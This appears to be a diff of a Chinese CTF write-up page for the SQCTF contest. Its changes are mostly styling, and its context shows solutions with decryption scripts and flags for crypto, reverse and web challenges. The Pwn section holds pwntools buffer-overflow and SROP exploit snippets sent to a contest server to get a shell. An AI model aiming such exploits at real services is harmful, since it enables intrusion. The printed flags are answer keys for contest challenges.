@@ -203,6 +203,13 @@
             
             <span class="tag">
                 
+                <a href="/tags/Writeup/" style="color: #00a596">
+                    Writeup
+                </a>
+            </span>
+            
+            <span class="tag">
+                
                 <a href="/tags/Misc/" style="color: #00bcd4">
                     Misc
                 </a>
@@ -210,42 +217,35 @@
             
             <span class="tag">
                 
-                <a href="/tags/Writeup/" style="color: #ffa2c4">
-                    Writeup
-                </a>
-            </span>
-            
-            <span class="tag">
-                
-                <a href="/tags/Pwn/" style="color: #ff7d73">
+                <a href="/tags/Pwn/" style="color: #00a596">
                     Pwn
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/CTF/" style="color: #03a9f4">
+                <a href="/tags/CTF/" style="color: #ffa2c4">
                     CTF
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/Crypto/" style="color: #ffa2c4">
+                <a href="/tags/Crypto/" style="color: #00bcd4">
                     Crypto
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/Reverse/" style="color: #03a9f4">
+                <a href="/tags/Reverse/" style="color: #00a596">
                     Reverse
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/Web/" style="color: #00a596">
+                <a href="/tags/Web/" style="color: #ff7d73">
                     Web
                 </a>
             </span>
@@ -270,7 +270,7 @@
 <h2 id="piet"><a href="#piet" class="headerlink" title="piet"></a>piet</h2><p>piet加密，随便找个工具跑一下就能得到结果</p>
 <p>SQCTF{Hello world!}</p>
 <h2 id="FFT-IFFT"><a href="#FFT-IFFT" class="headerlink" title="FFT IFFT"></a>FFT IFFT</h2><p>逆FFT变换，写个脚本即可</p>
-<pre><code class="python">import os
+<pre><code class="language-python">import os
 import cv2
 import struct
 import numpy as np
@@ -327,10 +327,8 @@ if __name__ == &#39;__main__&#39;:
 </code></pre>
 <p>SQCTF{HELLO}</p>
 <h2 id="孩儿们等我破军"><a href="#孩儿们等我破军" class="headerlink" title="孩儿们等我破军"></a>孩儿们等我破军</h2><p>压缩包密码是爆破出来的，15375022是密码</p>
-<p>解出来后给了6个铁剑，有不同的编号。解一下附图给的矩阵就有顺序了。<br>$$\begin{aligned} A &amp;&#x3D; \begin{pmatrix} 1 &amp; 2 \</p>
-<p> 3 &amp; 4 \end{pmatrix}, \ B &amp;&#x3D; \begin{pmatrix} 7 &amp; 5 &amp; 6 \</p>
-<p> 4 &amp; 9 &amp; 8 \end{pmatrix}, \ AB &amp;&#x3D; \begin{pmatrix} 15 &amp; 23 &amp; 22 \</p>
-<p> 37 &amp; 51 &amp; 50 \end{pmatrix}. \end{aligned}$$<br>然后按照这个顺序在6个铁剑的文件尾能找到reflect&#x3D;{}这样格式的特征，把花括号的内容拼一块<br><code>WeL1c0Me</code>这就是222的密码<br>解出来一个风暴巨剑，文件尾有一个密码<code>O5XXOILUMETXGIDDORTGK4R7EE======</code></p>
+<p>解出来后给了6个铁剑，有不同的编号。解一下附图给的矩阵就有顺序了。<br>$$A &#x3D; \begin{pmatrix} 1 &amp; 2 \\3 &amp; 4 \end{pmatrix}B &#x3D; \begin{pmatrix} 7 &amp; 5 &amp; 6 \\4 &amp; 9 &amp; 8 \end{pmatrix}AB &#x3D; \begin{pmatrix} 15 &amp; 23 &amp; 22 \\37 &amp; 51 &amp; 50 \end{pmatrix}$$</p>
+<p>然后按照这个顺序在6个铁剑的文件尾能找到reflect&#x3D;{}这样格式的特征，把花括号的内容拼一块<br><code>WeL1c0Me</code>这就是222的密码<br>解出来一个风暴巨剑，文件尾有一个密码<code>O5XXOILUMETXGIDDORTGK4R7EE======</code></p>
 <p>base32解一下解出来<code>wow!ta&#39;s ctfer?!</code></p>
 <p>作为快了快了的密码</p>
 <p>解出来一个二维码，进行处理后扫描，得到<code>ZmxhZ3vkurLniLHnmoTlj6zllKTluIjvvJrmrKLov47mnaXliLBzcW51Y3Rm77yBfQ==</code></p>
@@ -345,7 +343,7 @@ if __name__ == &#39;__main__&#39;:
 <h2 id="Input-a-Number"><a href="#Input-a-Number" class="headerlink" title="Input a Number"></a>Input a Number</h2><p>简单的进制转换<br>payload:<code>?sqctf=0337522</code></p>
 <p>sqctf{609c716a66f14179970636df2abe6478}</p>
 <h2 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h2><p>用自动化做的，附脚本</p>
-<pre><code class="python">from selenium import webdriver
+<pre><code class="language-python">from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.edge.options import Options
 
@@ -442,7 +440,7 @@ finally:
 <h2 id="你的天赋是什么"><a href="#你的天赋是什么" class="headerlink" title="你的天赋是什么"></a>你的天赋是什么</h2><p>摩斯密码解一下即可</p>
 <p>SQCTF{YOU-HAVE-TALENT}</p>
 <h2 id="简单RSA"><a href="#简单RSA" class="headerlink" title="简单RSA"></a>简单RSA</h2><p>模数n可以通过factordb得到p和q两个数</p>
-<pre><code class="python">e = 65537
+<pre><code class="language-python">e = 65537
 n = 7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533
 c = 3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616
 
@@ -471,7 +469,7 @@ print(&quot;Decrypted message:&quot;, message_bytes.decode(&#39;utf-8&#39;))
 <h2 id="春风得意马蹄疾"><a href="#春风得意马蹄疾" class="headerlink" title="春风得意马蹄疾"></a>春风得意马蹄疾</h2><p>嵌套的核心价值观编码，将每次解码出的内容再次解码，就能得到flag</p>
 <p>SQCTF{E2jacnicamcm_cnanamw_kwkma}</p>
 <h2 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h2><p>中国剩余定理</p>
-<pre><code class="python">from gmpy2 import iroot
+<pre><code class="language-python">from gmpy2 import iroot
 from Crypto.Util.number import long_to_bytes
 
 n1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681
@@ -505,7 +503,7 @@ else:
 </code></pre>
 <p>SQCTF{CRT_Unl0cks_RSA_Eff1c13ncy}</p>
 <h2 id="ez-SCA"><a href="#ez-SCA" class="headerlink" title="ez_SCA"></a>ez_SCA</h2><p>AI写的</p>
-<pre><code class="python">import numpy as np
+<pre><code class="language-python">import numpy as np
 
 # 加载模板轨迹文件
 template_trace_0 = np.load(&#39;template_trace_0.npy&#39;)
@@ -545,7 +543,7 @@ print(&quot;Recovered flag:&quot;, flag)
 <h2 id="丢三落四的小I"><a href="#丢三落四的小I" class="headerlink" title="丢三落四的小I"></a>丢三落四的小I</h2><p>仅dp泄露类型，工具直接一把梭<br>SQCTF{7b909221-c8ff-f391-0c86-d3a9ca8491d1}</p>
 <h2 id="Common-Modulus"><a href="#Common-Modulus" class="headerlink" title="Common Modulus"></a>Common Modulus</h2><p>共模攻击，同样工具直接一把梭<br>SQCTF{06774dcf-b9d1-3c2d-8917-7d2d86b6721c}</p>
 <h2 id="失落矿洞中的密码"><a href="#失落矿洞中的密码" class="headerlink" title="失落矿洞中的密码"></a>失落矿洞中的密码</h2><p>ECC类型，给出脚本</p>
-<pre><code class="python">import time
+<pre><code class="language-python">import time
 
 # --- Elliptic Curve Parameters ---
 a = 1234577
@@ -768,7 +766,7 @@ else:
      print(&quot;\nDecryption cannot proceed because the secret key was not found.&quot;)
 </code></pre>
 <p>SQCTF{5720914}</p>
-<h1 id="Reverse-解出13题"><a href="#Reverse-解出13题" class="headerlink" title="Reverse 解出13题"></a>Reverse 解出13题</h1><h2 id="天下谁人不识君"><a href="#天下谁人不识君" class="headerlink" title="天下谁人不识君"></a>天下谁人不识君</h2><pre><code class="python">flag = &#39;SQCTF&#123;xxxxxxxxxxxxxx&#125;&#39;
+<h1 id="Reverse-解出13题"><a href="#Reverse-解出13题" class="headerlink" title="Reverse 解出13题"></a>Reverse 解出13题</h1><h2 id="天下谁人不识君"><a href="#天下谁人不识君" class="headerlink" title="天下谁人不识君"></a>天下谁人不识君</h2><pre><code class="language-python">flag = &#39;SQCTF&#123;xxxxxxxxxxxxxx&#125;&#39;
 s = &#39;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#39;
 result = &#39;&#39;
 for i in range(len(flag)):
@@ -804,21 +802,21 @@ print(&quot;Reversed flag:&quot;, &quot;&quot;.join(reversed_flag))
 <h2 id="遇事不决，可问春风"><a href="#遇事不决，可问春风" class="headerlink" title="遇事不决，可问春风"></a>遇事不决，可问春风</h2><p>这段代码是一个Android应用的逆向分析结果，用于生成和验证Flag。以下是关键步骤分析：</p>
 <ol>
 <li><p><strong>Flag结构</strong>：</p>
-<pre><code class="java">private String buildFlag(String password) &#123;
+<pre><code class="language-java">private String buildFlag(String password) &#123;
     return &quot;SQCTF&#123;i_am_a_&quot; + password + &quot;&#125;&quot;;
 &#125;
 </code></pre>
 <p>Flag格式为<code>SQCTF&#123;i_am_a_密码&#125;</code>，其中密码需要解密得到。</p>
 </li>
 <li><p><strong>密码验证逻辑</strong>：</p>
-<pre><code class="java">private boolean checkPassword(String input) &#123;
+<pre><code class="language-java">private boolean checkPassword(String input) &#123;
     return input.equals(this.decryptPassword());
 &#125;
 </code></pre>
 <p>用户输入需要等于<code>decryptPassword()</code>的解密结果。</p>
 </li>
 <li><p><strong>密码解密过程</strong>：</p>
-<pre><code class="java">private String decryptPassword() &#123;
+<pre><code class="language-java">private String decryptPassword() &#123;
     String encrypted = getEncryptedPassword(); // 获取加密后的字符串
     char[] chars = encrypted.toCharArray();
     StringBuilder result = new StringBuilder();
@@ -831,7 +829,7 @@ print(&quot;Reversed flag:&quot;, &quot;&quot;.join(reversed_flag))
 </code></pre>
 </li>
 <li><p><strong>加密字符串生成</strong>：</p>
-<pre><code class="java">private String getEncryptedPassword() &#123;
+<pre><code class="language-java">private String getEncryptedPassword() &#123;
     String[] parts = &#123;&quot;5&quot;,&quot;#&quot;,&quot;)&quot;,&quot;7&quot;,&quot;5&quot;,&quot;#&quot;,&quot;)&quot;,&quot;7&quot;&#125;;
     StringBuilder sb = new StringBuilder();
     for (String part : parts) &#123;
@@ -847,7 +845,7 @@ print(&quot;Reversed flag:&quot;, &quot;&quot;.join(reversed_flag))
 <li><code>#</code> → ASCII 0x23 → 0x23 ^ 0x42 &#x3D; 0x61 → <code>a</code></li>
 <li><code>)</code> → ASCII 0x29 → 0x29 ^ 0x42 &#x3D; 0x6B → <code>k</code></li>
 <li><code>7</code> → ASCII 0x37 → 0x37 ^ 0x42 &#x3D; 0x75 → <code>u</code></li>
-<li>重复后得到完整密码：**<code>wakuwaku</code>**</li>
+<li>重复后得到完整密码：<strong><code>wakuwaku</code></strong></li>
 </ul>
 </li>
 </ol>
@@ -855,7 +853,7 @@ print(&quot;Reversed flag:&quot;, &quot;&quot;.join(reversed_flag))
 <pre><code>SQCTF&#123;i_am_a_wakuwaku&#125;
 </code></pre>
 <h2 id="人生自古谁无死"><a href="#人生自古谁无死" class="headerlink" title="人生自古谁无死"></a>人生自古谁无死</h2><p>本质上是chacha20加密</p>
-<pre><code class="python"># 生成v3密钥
+<pre><code class="language-python"># 生成v3密钥
 g_obf2 = b&#39;\xde\xad\xbe\xef&#39;
 v3 = bytes([g_obf2[i % 4] ^ (i + 17) for i in range(32)])
 
@@ -916,7 +914,7 @@ print(&quot;Decrypted Flag:&quot;, plaintext.decode(&#39;latin-1&#39;))
 </code></pre>
 <p>SQCTF{real_chacha20_flag}</p>
 <h2 id="春风也有春风愁"><a href="#春风也有春风愁" class="headerlink" title="春风也有春风愁"></a>春风也有春风愁</h2><p>异或加密</p>
-<pre><code class="c">#include &lt;stdio.h&gt;
+<pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdint.h&gt;
 
 int main() &#123;
@@ -936,7 +934,7 @@ int main() &#123;
     return 0;
 &#125;
 </code></pre>
-<pre><code class="python">v6 = [0]*15
+<pre><code class="language-python">v6 = [0]*15
 v6[0] = 13
 v6[1] = 11
 v6[2] = 253
@@ -967,7 +965,7 @@ for byte in v6:
 print(&quot;Flag:&quot;, &#39;&#39;.join(flag))
 </code></pre>
 <p>sqctf{easy_xor}</p>
-<h2 id="你若安好便是晴"><a href="#你若安好便是晴" class="headerlink" title="你若安好便是晴"></a>你若安好便是晴</h2><pre><code class="python">import struct
+<h2 id="你若安好便是晴"><a href="#你若安好便是晴" class="headerlink" title="你若安好便是晴"></a>你若安好便是晴</h2><pre><code class="language-python">import struct
 
 def sub_101(data, key):
     v0 = struct.unpack(&quot;&lt;I&quot;, data[:4])[0]
@@ -1029,7 +1027,7 @@ if __name__ == &quot;__main__&quot;:
 </code></pre>
 <p>SQCTF{nihaobuhaobuhaoxixi}</p>
 <h2 id="即随本心"><a href="#即随本心" class="headerlink" title="即随本心"></a>即随本心</h2><p>还是pyinstaller打包的exe<br>pyinstxtractor解包后反编译pyc只能得到部分内容，不过完全够用了<br>AES加密</p>
-<pre><code class="python">key = b&#39;1234567890abcdef&#39;
+<pre><code class="language-python">key = b&#39;1234567890abcdef&#39;
 iv = b&#39;1234567890abcdef&#39;
 expected_encrypted_data = &#39;MTIzNDU2Nzg5MGFiY2RlZpOn0SHxbVMvaa7jQztMCBtCCiuX+ZRBzSfcL01St5Bmi8BjGeuXliictrjqzSpCGw==&#39;
 </code></pre>
@@ -1037,7 +1035,7 @@ expected_encrypted_data = &#39;MTIzNDU2Nzg5MGFiY2RlZpOn0SHxbVMvaa7jQztMCBtCCiuX+
 <p>得到<code>SQCTF&#123;qianniananshi_yidengjiming&#125;</code></p>
 <h2 id="唧唧复唧唧，木兰当户织"><a href="#唧唧复唧唧，木兰当户织" class="headerlink" title="唧唧复唧唧，木兰当户织"></a>唧唧复唧唧，木兰当户织</h2><p>逆向得到base64<br>直接解得到SQCTF{xixibuxixi，mulandanghuzhi}<br>把逗号改成半角逗号就行了<br>SQCTF{xixibuxixi,mulandanghuzhi}</p>
 <h2 id="看山不是山"><a href="#看山不是山" class="headerlink" title="看山不是山"></a>看山不是山</h2><p>依旧是pyinstaller打包的exe<br>pyinstxtractor解包后反编译得到：</p>
-<pre><code class="python">def encrypt(data):
+<pre><code class="language-python">def encrypt(data):
     result = []
     key = 439041101
     for i in range(len(data)):
@@ -1056,7 +1054,7 @@ def check(data):
     return encrypted == target
 </code></pre>
 <p>解码：</p>
-<pre><code class="python">def decrypt(encrypted):
+<pre><code class="language-python">def decrypt(encrypted):
     key = 439041101
     key_bytes = [(key &gt;&gt; (shift * 8)) &amp; 0xFF for shift in [0, 1, 2, 3]]
     result = []
@@ -1075,7 +1073,7 @@ print(&quot;Flag:&quot;, original.hex())
 </code></pre>
 <p>SQCTF{3ebfb8b9fefff8c3a426104630a294fa}</p>
 <h2 id="ezRe"><a href="#ezRe" class="headerlink" title="ezRe"></a>ezRe</h2><p>pyinstxtractor解包后反编译pyc得到下面的内容</p>
-<pre><code class="python"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
+<pre><code class="language-python"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
 # Version : Python 3.9
 
 import base64
@@ -1087,10 +1085,10 @@ print(flag)
 <p>SQCTF{5ed2be45-2e83-48d2-b631-c088e51ee964}</p>
 <h2 id="慕然回首，那人却在灯火阑珊处"><a href="#慕然回首，那人却在灯火阑珊处" class="headerlink" title="慕然回首，那人却在灯火阑珊处"></a>慕然回首，那人却在灯火阑珊处</h2><p>ida打开发现有个maze数组</p>
 <p>进hex里看一下，提出来迷宫</p>
-<pre><code class="text">S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############
+<pre><code class="language-text">S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############
 </code></pre>
 <p>gemini写的，直接上解题脚本</p>
-<pre><code class="python">from collections import deque
+<pre><code class="language-python">from collections import deque
 
 maze_string = &quot;S**#########*########**#########**#########*###**##***###**##*#####**##*#####*E##*******############&quot;
 maze_grid = [list(maze_string[i:i+10]) for i in range(0, 100, 10)]
@@ -1158,7 +1156,7 @@ else:
 </code></pre>
 <p>sqctf{ddsssdssaasssddddddwd}</p>
 <h2 id="鹅鹅鹅，曲项向天歌"><a href="#鹅鹅鹅，曲项向天歌" class="headerlink" title="鹅鹅鹅，曲项向天歌"></a>鹅鹅鹅，曲项向天歌</h2><p>pyinstxtractor解包后反编译pyc得到下面的内容</p>
-<pre><code class="python"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
+<pre><code class="language-python"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
 # Version : Python 3.10
 
 
@@ -1180,7 +1178,7 @@ def verification():
     true_flag = part1 + part2 + part3
 </code></pre>
 <p>写个脚本逆向一下</p>
-<pre><code class="python">def decrypt(ciphertext):
+<pre><code class="language-python">def decrypt(ciphertext):
     # 分割密文
     part2_1 = ciphertext[:7]
     part2_2 = ciphertext[7:20]
@@ -1209,7 +1207,7 @@ flag
 <h2 id="圣人当仁不让"><a href="#圣人当仁不让" class="headerlink" title="圣人当仁不让"></a>圣人当仁不让</h2><p>ida反编译看一下算法</p>
 <p>实现了一个简单的字节操作函数，其功能是对输入的字符数组进行一系列的位运算。具体来说，对于数组中的每个元素，它先与0xAA进行异或操作，然后加5，再减2。这个操作对数组的前16个元素（0x10表示16）进行，然后对输出的内容做了base64加密</p>
 <p>那就逆向一下这个操作</p>
-<pre><code class="python">import base64
+<pre><code class="language-python">import base64
 
 # Base64 encoded string
 encoded_str = &quot;/P7sAe/U0s7c1vjb0vjfyt==&quot;
@@ -1229,7 +1227,7 @@ output_bytes
 <p>得到flag</p>
 <p>SQCTF{easy_re_vm}</p>
 <h2 id="往事暗沉不可追"><a href="#往事暗沉不可追" class="headerlink" title="往事暗沉不可追"></a>往事暗沉不可追</h2><p>pyinstxtractor解包后反编译pyc得到下面的内容</p>
-<pre><code class="python">#!/usr/bin/env python
+<pre><code class="language-python">#!/usr/bin/env python
 # visit https://tool.lu/pyc/ for more information
 # Version: Python 3.10
 
@@ -1327,7 +1325,7 @@ vm.execute(bytecode)
 final_memory = vm.get_memory()
 </code></pre>
 <p>解码脚本</p>
-<pre><code class="python">encrypted_data = [
+<pre><code class="language-python">encrypted_data = [
     127,
     131,
     125,
@@ -1360,19 +1358,19 @@ print(&quot;Decrypted Data (Numbers):&quot;, decrypted_data)
 <p>Decrypted Data (Numbers): [128, 124, 130, 132, 120, 128, 122, 132, 130, 124, 128, 120, 124, 132, 120, 130]</p>
 <p>flag就是SQCTF{128,124,130,132,120,128,122,132,130,124,128,120,124,132,120,130}</p>
 <h1 id="Pwn-解出4题"><a href="#Pwn-解出4题" class="headerlink" title="Pwn 解出4题"></a>Pwn 解出4题</h1><h2 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h2><p>nc连接即可拿到shell</p>
-<pre><code class="bash">ls
+<pre><code class="language-bash">ls
 cat flag
 </code></pre>
 <p>sqctf{24fee39487a84431b06db644c829f55c}</p>
 <h2 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h2><p>不用pwntool，直接nc连上去，灌进去77个A即可拿到shell</p>
-<pre><code class="bash">ls
+<pre><code class="language-bash">ls
 cat flag
 </code></pre>
 <p>sqctf{f89de5c863644168b7f9de37372ac1c7}</p>
 <h2 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h2><p>开了NX，不过没关系，照样打</p>
 <p>ida看一下，64个字节长的v4，还有8字节长的RBP寄存器，都需要覆盖掉</p>
 <p>也就是需要发送72字节的垃圾数据，然后才能跟地址</p>
-<pre><code class="python">from pwn import *
+<pre><code class="language-python">from pwn import *
 
 context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
 p=remote(&#39;challenge.qsnctf.com&#39;,30042)
@@ -1383,7 +1381,7 @@ payload += p64(shell_address)
 p.sendline(payload)
 p.interactive()
 </code></pre>
-<pre><code class="bash">ls /
+<pre><code class="language-bash">ls /
 cat /flag
 </code></pre>
 <p>sqctf{12f7861090ed42fda6c14dde2ad98caa}</p>
@@ -1391,7 +1389,7 @@ cat /flag
 <p>ida逆向，看到给了一个8字节的v3数组，read读了1024字节长，而且只有pop rax; ret这一个可用的gadget和程序里一个地址内存放着的binsh字符串</p>
 <p>很标准的srop题了。</p>
 <p>直接上payload</p>
-<pre><code class="python">from pwn import *
+<pre><code class="language-python">from pwn import *
 
 target = &#39;./pwn01&#39;
 
@@ -1429,7 +1427,7 @@ p.sendline(payload)
 
 p.interactive()
 </code></pre>
-<pre><code class="bash">ls /
+<pre><code class="language-bash">ls /
 cat /flag
 </code></pre>
 <p>sqctf{c14afe377c974cf6b9d380a91ac72095}</p>
